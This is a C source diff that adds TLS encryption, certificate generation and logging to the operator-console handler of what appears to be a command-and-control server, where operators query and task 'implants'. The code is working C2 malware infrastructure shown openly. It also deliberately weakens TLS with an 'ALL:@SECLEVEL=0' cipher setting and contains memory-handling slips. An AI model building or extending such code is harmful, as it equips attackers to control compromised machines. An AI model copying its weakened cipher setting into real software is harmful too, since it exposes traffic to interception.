@@ -10,12 +10,25 @@
 #include <unistd.h>
 #include <netinet/in.h>
 
+
+#include <openssl/evp.h>
+#include <openssl/x509v3.h>
+#include <openssl/rsa.h>
+#include <openssl/pem.h>
+#include <openssl/x509.h>
+#include <openssl/err.h>
+#include <openssl/ssl.h>
+#include <openssl/param_build.h>
+#include <openssl/core_names.h> 
+#include <openssl/sslerr.h>
+
+
 #include "db.h"
 #include "logs.h"
 
-int autheticate(int sock) {
+int autheticate(SSL *ssl) {
     char auth[1024];
-    int bytes_received = recv(sock, auth, sizeof(auth), 0);
+    int bytes_received = SSL_read(ssl, auth, sizeof(auth));//recv(sock, auth, sizeof(auth), 0);
     if (bytes_received <= 0) {
         perror("recv failed");
         return -1;
@@ -55,7 +68,9 @@ int autheticate(int sock) {
     if (authenticate_operator(username->valuestring, password->valuestring) != 0) {
         cJSON_AddStringToObject(reply, "authenticated", "false");
         char *reply_ = cJSON_Print(reply);
-        send(sock, reply_, strlen(reply_), 0);
+        //send(sock, reply_, strlen(reply_), 0);
+        SSL_write(ssl, reply_, strlen(reply_));
+        log_message(LOG_INFO, "Operator Failed to authenticate");
         free(reply_);
         free(reply);
         cJSON_Delete(creds);
@@ -64,7 +79,9 @@ int autheticate(int sock) {
     }
     cJSON_AddStringToObject(reply, "authenticated", "true");
     char *reply_ = cJSON_Print(reply);
-    send(sock, reply_, strlen(reply_), 0);
+    //send(sock, reply_, strlen(reply_), 0);
+    SSL_write(ssl, reply_, strlen(reply_));
+    log_message(LOG_INFO, "Operator Authenticated Successfully");
     free(reply_);
     free(reply);
 
@@ -127,24 +144,33 @@ char *interact_with_implant(cJSON *rinfo) {
 }
 
 
-void *operator_handler(void *new_sock) {
-    int sock = *(int*)new_sock;
-    
+void *operator_handler(void *Args) {
+    struct operator_handler_args_t {
+        SSL *ssl;
+    };
+
+    struct operator_handler_args_t *args = (struct operator_handler_args_t*)Args;
+    SSL *ssl = args->ssl;
+
     // 3 tries
     int try = 1;
     do {
-        if (autheticate(sock) == 0) {
+        if (autheticate(ssl) == 0) {
             goto START;
         } 
         try++;
     } while (try <= 3);
+
+
     return NULL;
+    
+    
     // operator requesting infomartion or add new tasks
     START:
     while (1) {
         char buffer[1024];
         memset(buffer, 0, sizeof(buffer));
-        int bytes_received = recv(sock, buffer, sizeof(buffer), 0);
+        int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1); // recv(sock, buffer, sizeof(buffer), 0);
         if (bytes_received <= 0) {
             //perror("recv failed");
             log_message(LOG_ERROR, "Failed to receive data from operator");
@@ -168,42 +194,67 @@ void *operator_handler(void *new_sock) {
         }
 
         if (strcmp(about->valuestring, "Implants") == 0){ // all info about implants
-            char *agents = GetData("Implants");
-            send(sock, agents, strlen(agents), 0);
-            free(agents);
+            char *implants = GetData("Implants");
+            //send(sock, agents, strlen(agents), 0);
+            SSL_write(ssl, implants, strlen(implants));
+            free(implants);
         } else if (strcmp(about->valuestring, "Tasks") == 0) {
             char *tasks = GetData("Tasks");
-            send(sock, tasks, strlen(tasks), 0);
+            //send(sock, tasks, strlen(tasks), 0);
+            SSL_write(ssl, tasks, strlen(tasks));
             free(tasks);
-        } else if (strcmp(about->valuestring, "Logs") == 0) {
-            char *logs = GetData("Logs");
-            send(sock, logs, strlen(logs), 0);
-            free(logs);
         } else if (strcmp(about->valuestring, "implant_id") == 0) {
             char *data = interact_with_implant(requested_info);
             if (data == NULL) {
-                send(sock, "ERROR", strlen("ERROR"), 0);
+                //send(sock, "ERROR", strlen("ERROR"), 0);
+                //SSL_write(ssl, reply_, sizeof("ERROR"));    
                 continue;
             }
-            send(sock, data, strlen(data), 0);
+            //send(sock, data, strlen(data), 0);
+            SSL_write(ssl, data, strlen(data));
             free(data);
         } else if (strncmp(about->valuestring, "exit", 4) == 0 ) {
+            log_message(LOG_INFO, "Operator Exiting");
             return NULL;
         }
         cJSON_Delete(requested_info);
     }
-    
-    close(sock);
-    free(new_sock);
+        
+    log_message(LOG_INFO, "Closed connection");
+    SSL_free(ssl);
     return NULL;
 }
 
 
-void *Operator_conn(void* port) {
-    int OPERATOR_PORT = *(int*)port;
+void *Operator_conn(void* args) {
+    init();
+
+    struct Args_t {
+        char cert[BUFFER_SIZE];
+        char key[BUFFER_SIZE];
+        int port;
+    };
+
+    struct Args_t *Args = (struct Args_t*)args;
+
+    char cert[BUFFER_SIZE];
+    char key[BUFFER_SIZE];
+    int OPERATOR_PORT = Args->port;
+
+    strncpy(cert, Args->cert, BUFFER_SIZE);
+    strncpy(key, Args->key, BUFFER_SIZE);
+
+        // generate certificates if they dont exesits
+    if (access(cert, F_OK) != 0 || access(key, F_OK) != 0) {
+        generate_key_and_cert(cert, key);
+    }
+    free(args);
+
     struct sockaddr_in clientAddr;
     socklen_t client_len = sizeof(clientAddr);
     int serverSock;
+
+
 
     serverSock = socket(AF_INET, SOCK_STREAM, 0);
     if (serverSock == -1) {
@@ -231,28 +282,60 @@ void *Operator_conn(void* port) {
         return NULL;
     }
     
+    // openssl to socket
+    const SSL_METHOD *method = TLS_server_method();
+    SSL_CTX *ctx = SSL_CTX_new(method);
+    if (!ctx) {
+        perror("Unable to create SSL context");
+        sleep(60);
+        return NULL;
+    }
+    SSL_CTX_set_cipher_list(ctx, "ALL:@SECLEVEL=0");  // Allows all ciphers for debugging
+       // load certificates and key
+       SSL_CTX_use_certificate_file(ctx, cert, SSL_FILETYPE_PEM);
+       SSL_CTX_use_PrivateKey_file(ctx, key, SSL_FILETYPE_PEM);
+    
+    
+    int sock;
     while (1) {
-        int sock;
         if ((sock = accept(serverSock, (struct sockaddr*)&clientAddr, (socklen_t*)&client_len)) < 0) {
             perror("Accept failed");
             continue;
         }
         
+        SSL *ssl = SSL_new(ctx);
+        SSL_set_fd(ssl, sock);
+        // perform tls handshake
+        if (SSL_accept(ssl) <= 0) {
+            log_message(LOG_ERROR, "TLS Handshake failed ");
+            //ERR_print_errors_fp(stderr);
+            SSL_free(ssl);
+            close(sock);
+            continue;
+        }
         // port = ntohs(clientAddr.sin_port) 
         // ip = inet_ntoa(client_addr.sin_addr)
 
+        struct operator_handler_args_t {
+            SSL *ssl;
+        };
+
+        struct operator_handler_args_t *args = malloc(sizeof(*args));
+        args->ssl = ssl;
+
         pthread_t thread;
-        int *new_sock = malloc(sizeof(int));
-        *new_sock = sock;
-        if (pthread_create(&thread, NULL, operator_handler, (void*)new_sock) < 0) {
-            perror("could not create thread");
-            free(new_sock);
+        if (pthread_create(&thread, NULL, operator_handler, (void*)args) < 0) {
+            log_message(LOG_ERROR, "Failed to create operator thread");
+            free(args);
             continue;
         }
+        log_message(LOG_INFO, "Operator Console connected successfully : Remote address : [%s:%d]", inet_ntoa(clientAddr.sin_addr), ntohs(clientAddr.sin_port));
+
         // Detach thread so resources are automatically freed on exit
         pthread_detach(thread);
     }
 
+    close(sock);
     close(serverSock);
     return NULL;
 
